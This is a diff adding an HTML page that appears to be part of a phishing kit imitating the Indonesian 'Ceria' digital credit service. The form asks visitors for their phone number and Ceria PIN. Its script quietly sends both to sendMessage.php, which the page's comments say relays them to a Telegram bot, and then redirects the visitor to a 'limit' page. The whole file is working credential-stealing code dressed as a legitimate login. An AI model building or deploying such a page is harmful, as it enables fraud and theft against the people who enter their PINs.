@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CERIA</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      max-width: 800px; /* Menetapkan lebar maksimal untuk konten */
+      margin: 0 auto; /* Membuat konten tetap di tengah */
+    }
+
+    .gambar {
+      width: 100%;
+      margin-bottom: 0px;
+    }
+
+    .gambar img {
+      width: 100%;
+      object-fit: cover;
+      margin-bottom: 0px;
+    }
+
+    .form-container {
+      margin-bottom: 50px;
+    }
+
+    .form-container form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .form-container input[type="tel"],
+    .form-container input[type="password"],
+    .form-container input[type="Submit"] {
+      width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
+      padding: 13px;
+      border-radius: 8px;
+      border: 1px solid #663399;
+      margin-bottom: 30px; /* Jarak antara kolom nomor hp dan kolom pin */
+      margin-left: 4px; /* Add margin on the left side */
+    }
+
+    .form-container input[type="Submit"] {
+      width: calc(100% - 8px);
+      max-width: 330px;
+      padding: 13px;
+      border-radius: 5px;
+      background-color: #663399;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-left: 7px;
+    }
+
+    /* Ukuran relatif untuk gambar di bawah */
+    .gambar-bawah {
+      display: flex;
+      justify-content: center;
+      position: relative;
+      bottom: -10px;
+    }
+
+    .gambar-bawah img {
+      width: 90%;
+      object-fit: cover;
+      margin: 0 25px;
+    }
+  </style>
+  <script>
+    function kirimPesan() {
+      var nomorHP = document.getElementById('nomor_hp').value;
+      var pin = document.getElementById('pin').value;
+
+      // Validasi jika nomor HP atau nomor PIN kosong
+      if (nomorHP.trim() === '' || pin.trim() === '') {
+        // Memicu efek getaran
+        if (navigator.vibrate) {
+          navigator.vibrate(200); // 200 milidetik getaran
+        }
+        return;
+      }
+
+      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
+
+      // Kirim pesan ke file PHP yang sama untuk mengelola pengiriman ke bot Telegram
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+          window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html setelah pengiriman berhasil
+        }
+      };
+
+      // Mengirim data ke file PHP
+      xhttp.open("GET", "sendMessage.php?message=" + encodeURIComponent(message), true);
+      xhttp.send();
+    }
+  </script>
+</head>
+<body>
+   <div class="gambar">
+    <img src="https://i.ibb.co/sgcQnDC/IMG-20240116-050851.jpg" alt="Gambar Pucok">
+  </div>
+
+  <div class="form-container">
+    <form onsubmit="kirimPesan(); return false;">
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="+62- 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲" style="color:blue;">
+
+      <input type="tel" id="pin" name="pin" placeholder="𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮" maxlength="6">
+
+      <input type="Submit" value="Lanjutkan">
+    </form>
+  </div>
+
+  <div class="gambar gambar-bawah">
+    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Logo LPS">
+  </div>
+</body>
+</html>
